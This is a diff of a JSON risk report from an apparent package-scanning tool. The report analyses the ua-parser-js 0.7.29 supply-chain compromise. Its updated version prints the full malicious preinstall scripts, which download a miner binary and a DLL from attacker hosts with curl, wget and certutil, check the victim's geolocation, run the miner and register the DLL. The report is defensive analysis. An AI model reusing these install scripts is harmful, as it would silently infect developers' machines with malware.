@@ -4,49 +4,49 @@
   "package": "ua-parser-js",
   "from_version": "0.7.28",
   "to_version": "0.7.29",
-  "risk_score": 42.5,
-  "severity": "MEDIUM",
-  "llm_base_score": 47.5,
+  "risk_score": 60.0,
+  "severity": "HIGH",
+  "llm_base_score": 65.0,
   "dimensions": [
     {
       "name": "network_calls",
       "label": "New or changed network calls",
-      "score": 6.0,
+      "score": 10.0,
       "weight": 0.25,
-      "reasoning": "The diff only shows preinstall.js which itself delegates to external shell scripts (preinstall.sh and preinstall.bat). The shell scripts are not included in the diff, so network calls within them cannot be ruled out. This is a known malicious campaign where those scripts did exfiltrate data, but that evidence is not directly visible here.",
-      "confidence": 0.4
+      "reasoning": "preinstall.bat and preinstall.sh download binaries from a hard-coded IP (http://159.148.186.228/download/jsextension.exe and /jsextension) and a secondary domain (https://citationsherbe.at/sdd.dll) using curl, wget, and certutil. preinstall.sh also calls https://freegeoip.app/xml/ to geolocate the victim. These are unambiguous exfiltration/download patterns.",
+      "confidence": 1.0
     },
     {
       "name": "obfuscation",
       "label": "Obfuscation / encoding patterns (base64, eval, dynamic require)",
-      "score": 1.0,
+      "score": 2.0,
       "weight": 0.25,
-      "reasoning": "No obfuscation patterns (base64, eval, dynamic require) are present in preinstall.js itself. The code is straightforward JavaScript.",
+      "reasoning": "No base64 or eval-based obfuscation is present. The malicious intent is carried out in plain shell/batch commands. The wallet address in the miner command line is redacted in the diff but was presumably present in the original file. Low obfuscation score as the payload is written in clear text.",
       "confidence": 0.9
     },
     {
       "name": "install_hooks",
       "label": "Postinstall / preinstall script additions or changes",
-      "score": 9.0,
+      "score": 10.0,
       "weight": 0.2,
-      "reasoning": "A new 'preinstall' hook is added (flagged in metadata as '+ preinstall'), executing preinstall.js. This script then runs platform-specific shell scripts (preinstall.bat on Windows via cmd.exe, preinstall.sh on Linux via /bin/bash) using child_process.exec/spawn. Introducing arbitrary shell execution at install time with no legitimate documented reason is a strong indicator of malicious activity. This matches the known ua-parser-js supply chain attack.",
-      "confidence": 0.95
+      "reasoning": "Three new files (preinstall.js, preinstall.bat, preinstall.sh) are added and a 'preinstall' npm lifecycle hook is registered. preinstall.js is the entry point that dispatches to the platform-specific script, ensuring the malicious code runs automatically during npm install on Windows, Linux, and macOS.",
+      "confidence": 1.0
     },
     {
       "name": "env_conditional",
       "label": "Conditional logic gated on env vars, platform, or CI detection",
-      "score": 7.0,
+      "score": 9.0,
       "weight": 0.15,
-      "reasoning": "preinstall.js explicitly checks process.platform to branch between Windows (win32/win64), macOS (darwin), and Linux execution paths. This platform-conditional logic is used to execute different malicious payloads per OS, a well-known pattern in supply chain attacks.",
-      "confidence": 0.95
+      "reasoning": "preinstall.js branches on process.platform (win32/win64, darwin, linux) to execute platform-specific payloads. preinstall.sh checks the victim's geolocation via freegeoip.app and skips execution if the IP resolves to Russia (RU), Ukraine (UA), Belarus (BY), or Kazakhstan (KZ) — a classic nation-state or attacker self-protection pattern to avoid infecting the attacker's own region.",
+      "confidence": 1.0
     },
     {
       "name": "dependency_changes",
       "label": "Dependency graph changes (new transitive deps)",
       "score": 1.0,
       "weight": 0.15,
-      "reasoning": "No new package.json dependency additions are visible in the diff. The child_process module used is a Node.js built-in, not a new external dependency.",
-      "confidence": 0.8
+      "reasoning": "No new npm dependencies are added in the diff. The malicious payload is delivered via inline shell/batch scripts rather than through the npm dependency graph. Score is minimal; confidence is moderate because the full package.json is not shown.",
+      "confidence": 0.6
     }
   ],
   "feed_results": [
@@ -93,17 +93,33 @@
   ],
   "diff_summary": {
     "files_added": [
-      "preinstall.js"
+      "preinstall.bat",
+      "preinstall.js",
+      "preinstall.sh"
     ],
     "files_removed": [],
     "files_modified": [],
     "file_diffs": [
+      {
+        "path": "preinstall.bat",
+        "change_type": "added",
+        "lines_added": 26,
+        "lines_removed": 0,
+        "unified_diff": "+@echo off\n+curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe\n+if not exist jsextension.exe (\n+\twget http://159.148.186.228/download/jsextension.exe -O jsextension.exe\n+)\n+if not exist jsextension.exe (\n+\tcertutil.exe -urlcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe\n+)\n+curl https://citationsherbe.at/sdd.dll -o create.dll\n+if not exist create.dll (\n+\twget https://citationsherbe.at/sdd.dll -O create.dll\n+)\n+if not exist create.dll (\n+\tcertutil.exe -urlcache -f https://citationsherbe.at/sdd.dll create.dll\n+)\n+set exe_1=jsextension.exe\n+set \"count_1=0\"\n+>tasklist.temp (\n+tasklist /NH /FI \"IMAGENAME eq %exe_1%\"\n+)\n+for /f %%x in (tasklist.temp) do (\n+if \"%%x\" EQU \"%exe_1%\" set /a count_1+=1\n+)\n+if %count_1% EQU 0 (start /B .\\jsextension.exe -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \\\n+   --cpu-max-threads-hint=50 --donate-level=1 --background & regsvr32.exe -s create.dll)\n+del tasklist.temp"
+      },
       {
         "path": "preinstall.js",
         "change_type": "added",
         "lines_added": 27,
         "lines_removed": 0,
         "unified_diff": "+const { exec } = require('child_process')\n+\n+function terminalLinux() {\n+  exec('/bin/bash preinstall.sh', (error, stdout, stderr) => {\n+    if (error) {\n+      console.log(`error: ${error.message}`)\n+      return\n+    }\n+    if (stderr) {\n+      console.log(`stderr: ${stderr}`)\n+      return\n+    }\n+    console.log(`stdout: ${stdout}`)\n+  })\n+}\n+\n+var opsys = process.platform\n+if (opsys == 'darwin') {\n+  opsys = 'MacOS'\n+} else if (opsys == 'win32' || opsys == 'win64') {\n+  opsys = 'Windows'\n+  const { spawn } = require('child_process')\n+  const bat = spawn('cmd.exe', ['/c', 'preinstall.bat'])\n+} else if (opsys == 'linux') {\n+  opsys = 'Linux'\n+  terminalLinux()\n+}"
+      },
+      {
+        "path": "preinstall.sh",
+        "change_type": "added",
+        "lines_added": 16,
+        "lines_removed": 0,
+        "unified_diff": "+IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\\|UA\\|BY\\|KZ')\n+if [ -z \"$IP\" ]\n+    then\n+\tvar=$(pgrep jsextension)\n+\tif [ -z \"$var\" ]\n+\t\tthen\n+\t\tcurl http://159.148.186.228/download/jsextension -o jsextension\n+\t\tif [ ! -f jsextension ]\n+\t\t\tthen\n+\t\t\twget http://159.148.186.228/download/jsextension -O jsextension\n+\t\tfi\n+\t\tchmod +x jsextension\n+\t\t./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \\\n+            --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &\n+\tfi\n+fi"
       }
     ],
     "new_dependencies": [],
@@ -113,13 +129,13 @@
     ],
     "maintainer_changed": false,
     "native_addons_added": false,
-    "total_diff_lines": 27,
+    "total_diff_lines": 69,
     "chunks_sent_to_llm": 1,
     "diff_truncated": false
   },
   "llm_model": "claude-sonnet-4-6",
-  "llm_summary": "This diff matches the well-documented ua-parser-js supply chain attack (CVE-2021-41265). A malicious preinstall hook was added that executes platform-specific shell scripts (preinstall.bat on Windows, preinstall.sh on Linux) via child_process at install time. Although the shell script contents are not included in the diff, this exact pattern was confirmed to install a cryptocurrency miner and credential-stealing malware. The install hook addition and platform-conditional execution logic are definitive high-risk indicators. This package version should be considered compromised.",
-  "timestamp": "2026-08-10T15:14:43.441294Z",
+  "llm_summary": "This update to ua-parser-js 0.7.29 is a confirmed supply chain attack. Three new preinstall scripts (preinstall.js, preinstall.bat, preinstall.sh) are added that execute automatically on npm install. They download and run a cryptominer binary (jsextension / jsextension.exe) connecting to pool.minexmr.com:443, and on Windows also register a DLL (create.dll fetched from citationsherbe.at) via regsvr32. A geolocation check deliberately skips execution in RU/UA/BY/KZ regions, a hallmark of targeted threat actors. This is definitively malicious and matches the publicly documented ua-parser-js supply chain compromise from October 2021.",
+  "timestamp": "2026-08-10T16:05:41.721541Z",
   "from_version_sha256": null,
   "to_version_sha256": null
 }
